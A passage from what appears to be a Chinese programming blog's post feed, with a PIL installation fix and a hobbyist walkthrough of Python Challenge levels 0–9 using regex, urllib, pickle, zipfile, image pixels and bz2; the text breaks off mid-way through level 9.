class="string">named</span> <span class="string">PIL</span></span><br><span class="line"><span class="attr">IOError:</span> <span class="string">decoder</span> <span class="string">jpeg</span> <span class="string">not</span> <span class="string">available</span></span><br></pre></td></tr></table></figure></p><p>注意我这里用的是<code>python2</code>，使用 <code>python3</code>的话，最后库名字是带有引号的</p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>手动把<code>/Library/Python/2.7/site-packages</code>里面的<code>PIL</code>、<code>pillow</code>、<code>Image</code>都给删除了，这里需要输入密码<br>然后使用这一个就全部OK了:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install <span class="built_in">image</span></span><br></pre></td></tr></table></figure></p><p>就连之前<code>jpeg</code>文件无法解析的问题都一并解决了哟</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python Challenge 1-10</title>
      <link href="/2015/10-14-pythonchallenge/"/>
      <url>/2015/10-14-pythonchallenge/</url>
      
        <content type="html"><![CDATA[<p>这几天学校极客大挑战，三道编程题<br>然后发现这种才有意思嘛。。。<br>又找了一个：<a href="http://www.pythonchallenge.com" target="_blank" rel="noopener">python challenge</a><br>感觉这种挑战比看书好多了<br><a id="more"></a></p><hr><h1 id="第〇关简单计算"><a href="#第〇关简单计算" class="headerlink" title="第〇关简单计算"></a><a href="http://www.pythonchallenge.com/pc/def/0.html" target="_blank" rel="noopener">第〇关</a>简单计算</h1><p>求2^38: <code>2**38</code> 即可  </p><hr><h1 id="第一关字符串操作"><a href="#第一关字符串操作" class="headerlink" title="第一关字符串操作"></a><a href="http://www.pythonchallenge.com/pc/def/274877906944.html" target="_blank" rel="noopener">第一关</a>字符串操作</h1><p>将字符串中得字母移2位<br>不仅仅是改图上的三个字母，是26个全部改<br>用的<code>ord()</code>&amp;<code>chr()</code>把26个字符都加二，然后发现<code>y</code>和<code>z</code>加二就出去了，然后又加了几个<code>if</code>来限制<br>黑哥说 <code>maketrans</code>就行了，看上去很方便，还没有研究。。。  </p><hr><h1 id="第二关字符串操作"><a href="#第二关字符串操作" class="headerlink" title="第二关字符串操作"></a><a href="http://www.pythonchallenge.com/pc/def/ocr.html" target="_blank" rel="noopener">第二关</a>字符串操作</h1><p>找原文件里出现的英文字符<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = 原文</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> ord(i)&gt;<span class="number">95</span> <span class="keyword">and</span> ord(i)&lt;<span class="number">122</span>:</span><br><span class="line">        print(i,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></p><hr><h1 id="第三关正则表达式"><a href="#第三关正则表达式" class="headerlink" title="第三关正则表达式"></a><a href="http://www.pythonchallenge.com/pc/def/equality.html" target="_blank" rel="noopener">第三关</a>正则表达式</h1><p>hint 是这个<br><code>One small letter, surrounded by EXACTLY three big bodyguards on each of its sides.</code><br>想了半天没有理解他什么意思，特别是那个<code>its</code>因为没有<code>&#39;apostrophe撇号</code>相当恼火<br>其实是说文字里的每一个字母都被有且仅有的三个大写字母围起来了<br>这个就是正则的查找:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">r"[a-z][A-Z]&#123;3&#125;[a-z]&#123;1&#125;[A-Z]&#123;3&#125;[a-z]"</span></span><br></pre></td></tr></table></figure></p><hr><h1 id="第四关-urllib"><a href="#第四关-urllib" class="headerlink" title="第四关 urllib"></a><a href="http://www.pythonchallenge.com/pc/def/linkedlist.html" target="_blank" rel="noopener">第四关</a> urllib</h1><p>从网页中获取数字添加在<code>php</code>末尾然后继续访问<br>就是<code>urllib</code>的操作:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">nothing = <span class="string">"数字"</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">'http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing='</span>+nothing</span><br><span class="line">    <span class="keyword">global</span> nothing</span><br><span class="line">    nothing = urllib.request.urlopen(url).read().decode()[<span class="number">23</span>:].strip()</span><br><span class="line">    print(nothing)</span><br></pre></td></tr></table></figure></p><hr><h1 id="第五关pickle-、字典"><a href="#第五关pickle-、字典" class="headerlink" title="第五关pickle 、字典"></a><a href="http://www.pythonchallenge.com/pc/def/peak.html" target="_blank" rel="noopener">第五关</a>pickle 、字典</h1><p>叫你 pronunce 一幅山峰的图片<br><img src="http://www.pythonchallenge.com/pc/def/peakhell.jpg" alt=""><br><code>peak hall</code>-&gt;<code>pickle</code><br>这个<code>pickle</code>文件已经在原文件中给你了<code>banner.pickle</code><br>使用<code>pickle</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"banner.pickle"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dic = pickle.load(f)</span><br></pre></td></tr></table></figure></p><p>这样<code>pickle</code>里面的文件就储存在 <code>dic</code> 这个字典里面了<br>字典内容如下：<br><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[(' ', <span class="number">95</span>)]</span><br><span class="line">[(' ', <span class="number">14</span>), ('#', <span class="number">5</span>), (' ', <span class="number">70</span>), ('#', <span class="number">5</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">15</span>), ('#', <span class="number">4</span>), (' ', <span class="number">71</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">15</span>), ('#', <span class="number">4</span>), (' ', <span class="number">71</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">15</span>), ('#', <span class="number">4</span>), (' ', <span class="number">71</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">15</span>), ('#', <span class="number">4</span>), (' ', <span class="number">71</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">15</span>), ('#', <span class="number">4</span>), (' ', <span class="number">71</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">15</span>), ('#', <span class="number">4</span>), (' ', <span class="number">71</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">15</span>), ('#', <span class="number">4</span>), (' ', <span class="number">71</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">6</span>), ('#', <span class="number">3</span>), (' ', <span class="number">6</span>), ('#', <span class="number">4</span>), (' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">9</span>), ('#', <span class="number">3</span>), (' ', <span class="number">7</span>), ('#', <span class="number">5</span>), (' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">5</span>), (' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">10</span>), ('#', <span class="number">3</span>), (' ', <span class="number">7</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">3</span>), ('#', <span class="number">2</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">7</span>), (' ', <span class="number">5</span>), ('#', <span class="number">2</span>), (' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">6</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">7</span>), (' ', <span class="number">3</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">7</span>), (' ', <span class="number">5</span>), ('#', <span class="number">3</span>), (' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">5</span>), ('#', <span class="number">3</span>), (' ', <span class="number">2</span>), ('#', <span class="number">5</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">3</span>), ('#', <span class="number">4</span>), (' ', <span class="number">4</span>), ('#', <span class="number">5</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">5</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">5</span>), ('#', <span class="number">3</span>), (' ', <span class="number">3</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">1</span>), ('#', <span class="number">3</span>), (' ', <span class="number">11</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">6</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">1</span>), ('#', <span class="number">3</span>), (' ', <span class="number">11</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">10</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">7</span>), ('#', <span class="number">3</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[('#', <span class="number">4</span>), (' ', <span class="number">11</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">2</span>), (' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">4</span>), (' ', <span class="number">7</span>), ('#', <span class="number">3</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[('#', <span class="number">4</span>), (' ', <span class="number">11</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">3</span>), ('#', <span class="number">10</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">14</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[('#', <span class="number">4</span>), (' ', <span class="number">11</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">4</span>), (' ', <span class="number">12</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[('#', <span class="number">4</span>), (' ', <span class="number">11</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">4</span>), (' ', <span class="number">12</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">1</span>), ('#', <span class="number">3</span>), (' ', <span class="number">11</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">12</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">6</span>), ('#', <span class="number">2</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">6</span>), ('#', <span class="number">2</span>), (' ', <span class="number">3</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">3</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">2</span>), (' ', <span class="number">3</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">3</span>), ('#', <span class="number">11</span>), (' ', <span class="number">3</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">2</span>), ('#', <span class="number">4</span>), (' ', <span class="number">5</span>), ('#', <span class="number">4</span>), (' ', <span class="number">4</span>), ('#', <span class="number">3</span>), (' ', <span class="number">4</span>), ('#', <span class="number">2</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>)]</span><br><span class="line">[(' ', <span class="number">6</span>), ('#', <span class="number">3</span>), (' ', <span class="number">5</span>), ('#', <span class="number">6</span>), (' ', <span class="number">4</span>), ('#', <span class="number">5</span>), (' ', <span class="number">4</span>), ('#', <span class="number">2</span>), (' ', <span class="number">4</span>), ('#', <span class="number">4</span>), (' ', <span class="number">1</span>), ('#', <span class="number">6</span>), (' ', <span class="number">4</span>), ('#', <span class="number">11</span>), (' ', <span class="number">4</span>), ('#', <span class="number">5</span>), (' ', <span class="number">6</span>), ('#', <span class="number">3</span>), (' ', <span class="number">6</span>), ('#', <span class="number">6</span>)]</span><br><span class="line">[(' ', <span class="number">95</span>)]</span><br></pre></td></tr></table></figure></p><p>想了半天发现每一个都是字符加数字的组合<br>再想了半天发现每一行的数字加起来都一样<br>猜到了就是这样的。。。<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex25vm2dmhj20lh0kyn27.jpg" alt=""> </p><hr><h1 id="第六关zipfile"><a href="#第六关zipfile" class="headerlink" title="第六关zipfile"></a><a href="http://www.pythonchallenge.com/pc/def/channel.html" target="_blank" rel="noopener">第六关</a>zipfile</h1><p>进去那个<code>paypal</code>跟题没有关系<br>源代码里面有个提示<code>zip</code>  就直接下载<code>channel.zip</code><br>解压出来跟第四关的规则差不多<br>关键就是读文件:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nothing = <span class="string">'90052'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">    text = nothing+<span class="string">'.txt'</span></span><br><span class="line">    nothing = open(<span class="string">"%s"</span>%text,<span class="string">"rb"</span>).read().decode()[<span class="number">15</span>:].strip()</span><br><span class="line">    print(nothing)</span><br></pre></td></tr></table></figure></p><p>最后一个是<code>46145.txt</code>:<br><code>Collect the comments.</code><br>然后又想了半天，原来 <code>zipfile</code>里面有一个<code>zipinfo</code>就叫做<code>comments</code><br>怎么用呢？<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_info</span><span class="params">(archive_name)</span>:</span></span><br><span class="line">    zf = zipfile.ZipFile(archive_name)</span><br><span class="line">    <span class="keyword">for</span> info <span class="keyword">in</span> zf.infolist():</span><br><span class="line">        <span class="keyword">print</span> info.filename</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\tComment:\t'</span>, info.comment</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\tModified:\t'</span>, datetime.datetime(*info.date_time)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\tSystem:\t\t'</span>, info.create_system, <span class="string">'(0 = Windows, 3 = Unix)'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\tZIP version:\t'</span>, info.create_version</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\tCompressed:\t'</span>, info.compress_size, <span class="string">'bytes'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\tUncompressed:\t'</span>, info.file_size, <span class="string">'bytes'</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_info(<span class="string">'channel.zip'</span>)</span><br></pre></td></tr></table></figure></p><p>显示如下:<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">README.txt</span></span><br><span class="line"><span class="attr">        Comment:</span></span><br><span class="line"><span class="attr">        Modified:</span>       <span class="number">2007</span><span class="bullet">-12</span><span class="bullet">-16</span> <span class="number">10</span><span class="string">:08:52</span></span><br><span class="line"><span class="attr">        System:</span>         <span class="number">3</span> <span class="string">(0</span> <span class="string">=</span> <span class="string">Windows,</span> <span class="number">3</span> <span class="string">=</span> <span class="string">Unix)</span></span><br><span class="line">        <span class="string">ZIP</span> <span class="attr">version:</span>    <span class="number">23</span></span><br><span class="line"><span class="attr">        Compressed:</span>     <span class="number">63</span> <span class="string">bytes</span></span><br><span class="line"><span class="attr">        Uncompressed:</span>   <span class="number">75</span> <span class="string">bytes</span></span><br></pre></td></tr></table></figure></p><p>然后结合最开始的顺序读出来:<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex281m1f0sj20st06wwj4.jpg" alt=""><br>这一关略麻烦呢。。。</p><hr><h1 id="第七关图片操作"><a href="#第七关图片操作" class="headerlink" title="第七关图片操作"></a><a href="http://www.pythonchallenge.com/pc/def/oxygen.html" target="_blank" rel="noopener">第七关</a>图片操作</h1><p><strong>从这一关开始后面都是用<code>python2</code>写的</strong><br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex286h3ncnj20hh02n0tj.jpg" alt=""><br>应该是灰度处理中间的一行灰色<br>然后读取出这个灰度值组成的数据<br>不出意料应该是包含了信息的。<br>使用<code>Image</code>来处理图片: <a href="http://gaoryrt.github.io/2015/10/16/install-python-package/" target="_blank" rel="noopener">加入第三方库文件</a><br>然后对这张图片进行切割，只留下灰色的部分:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">'oxygen.png'</span>).crop((<span class="number">0</span>,<span class="number">45</span>,<span class="number">608</span>,<span class="number">47</span>)) </span><br><span class="line"><span class="built_in">print</span> im.<span class="built_in">size</span></span><br></pre></td></tr></table></figure></p><p>用预览打开，发现每一个宽<code>7 pixel</code>，就开始读数据了:<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">87</span>):</span><br><span class="line">        L.<span class="built_in">append</span>(im.getpixel(((<span class="number">1</span>+<span class="number">7</span>*i),<span class="number">1</span>))[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span> L</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex336js6a2j21h401xdht.jpg" alt=""><br>这个是<code>aksii</code>哟~<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    k+=chr(i)</span><br><span class="line"><span class="builtin-name">print</span> k</span><br></pre></td></tr></table></figure></p><p>果然是这样的:<br><img src="http://ww3.sinaimg.cn/large/a243ad6cjw1ex339xjakhj20jo01074m.jpg" alt=""></p><hr><h1 id="第八关bz2"><a href="#第八关bz2" class="headerlink" title="第八关bz2"></a><a href="http://www.pythonchallenge.com/pc/def/integrity.html" target="_blank" rel="noopener">第八关</a>bz2</h1><p><strong>这一关没办法不是自己做的</strong><br>就是一个解压:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import bz2</span><br><span class="line">un='BZh91AY&amp;SYA<span class="symbol">\x</span>af<span class="symbol">\x</span>82<span class="symbol">\r</span><span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>01<span class="symbol">\x</span>01<span class="symbol">\x</span>80<span class="symbol">\x</span>02<span class="symbol">\x</span>c0<span class="symbol">\x</span>02<span class="symbol">\x</span>00 <span class="symbol">\x</span>00!<span class="symbol">\x</span>9ah3M<span class="symbol">\x</span>07&lt;]<span class="symbol">\x</span>c9<span class="symbol">\x</span>14<span class="symbol">\x</span>e1BA<span class="symbol">\x</span>06<span class="symbol">\x</span>be<span class="symbol">\x</span>084'</span><br><span class="line">pw= 'BZh91AY&amp;SY<span class="symbol">\x</span>94$|<span class="symbol">\x</span>0e<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>81<span class="symbol">\x</span>00<span class="symbol">\x</span>03$ <span class="symbol">\x</span>00!<span class="symbol">\x</span>9ah3M<span class="symbol">\x</span>13&lt;]<span class="symbol">\x</span>c9<span class="symbol">\x</span>14<span class="symbol">\x</span>e1BBP<span class="symbol">\x</span>91<span class="symbol">\x</span>f08'</span><br><span class="line">un=bz2.decompress(un)</span><br><span class="line">pw=bz2.decompress(pw)</span><br><span class="line">print un,pw</span><br></pre></td></tr></table></figure></p><hr><h1 id="第九关un-huge-pw-file"><a href="#第九关un-huge-pw-file" class="headerlink" title="第九关un:huge pw:file"></a><a href="http://www.pythonchallenge.com/pc/return/good.html" target="_blank" rel="noopener">第九关</a>un:<code>huge</code> pw:<code>file</code></h1><p><strong>这一关没有使用 <code>python</code></strong><br>源文件跟上一关的 <code>coords</code>一样的，就是连线<br>于是我把上一关的<code>html</code>的值改成这一关的了:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;working hard?&lt;/title&gt;</span><br><span class="line">  &lt;link rel="stylesheet" type="text/css" href="../style.css"&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;img src="integrity.jpg" width="<span class="number">640</span>" height="<span class="number">480</span>" border="<span class="number">0</span>" usemap="#notinsect"/&gt;</span><br><span class="line">    &lt;map name="notinsect"&gt;</span><br><span class="line">    &lt;area shape="poly" </span><br><span class="line">        coords="<span class="number">146,399,163</span>,<span class="number">403,170</span>,<span class="number">393,169</span>,<span class="number">391,166</span>,<span class="number">386,170</span>,<span class="number">381,170</span>,<span class="number">371,170</span>,<span class="number">355,169</span>,<span class="number">346,167</span>,<span class="number">335,170</span>,<span class="number">329,170</span>,<span class="number">320,170</span>,<span class="number">310,171</span>,<span class="number">301,173</span>,<span class="number">290,178</span>,<span class="number">289,182</span>,<span class="number">287,188</span>,<span class="number">286,190</span>,<span class="number">286,192</span>,<span class="number">291,194</span>,<span class="number">296,195</span>,<span class="number">305,194</span>,<span class="number">307,191</span>,<span class="number">312,190</span>,<span class="number">316,190</span>,<span class="number">321,192</span>,<span class="number">331,193</span>,<span class="number">338,196</span>,<span class="number">341,197</span>,<span class="number">346,199</span>,<span class="number">352,198</span>,<span class="number">360,197</span>,<span class="number">366,197</span>,<span class="number">373,196</span>,<span class="number">380,197</span>,<span class="number">383,196</span>,<span class="number">387,192</span>,<span class="number">389,191</span>,<span class="number">392,190</span>,<span class="number">396,189</span>,<span class="number">400,194</span>,<span class="number">401,201</span>,<span class="number">402,208</span>,<span class="number">403,213</span>,<span class="number">402,216</span>,<span class="number">401,219</span>,<span class="number">397,219</span>,<span class="number">393,216</span>,<span class="number">390,215</span>,<span class="number">385,215</span>,<span class="number">379,213</span>,<span class="number">373,213</span>,<span class="number">365,212</span>,<span class="number">360,210</span>,<span class="number">353,210</span>,<span class="number">347,212</span>,<span class="number">338,213</span>,<span class="number">329,214</span>,<span class="number">319,215</span>,<span class="number">311,215</span>,<span class="number">306,216</span>,<span class="number">296,218</span>,<span class="number">290,221</span>,<span class="number">283,225</span>,<span class="number">282,233</span>,<span class="number">284,238</span>,<span class="number">287,243</span>,<span class="number">290,250</span>,<span class="number">291,255</span>,<span class="number">294,261</span>,<span class="number">293,265</span>,<span class="number">291,271</span>,<span class="number">291,273</span>,<span class="number">289,278</span>,<span class="number">287,279</span>,<span class="number">285,281</span>,<span class="number">280,284</span>,<span class="number">278,284</span>,<span class="number">276,287</span>,<span class="number">277,289</span>,<span class="number">283,291</span>,<span class="number">286,294</span>,<span class="number">291,296</span>,<span class="number">295,299</span>,<span 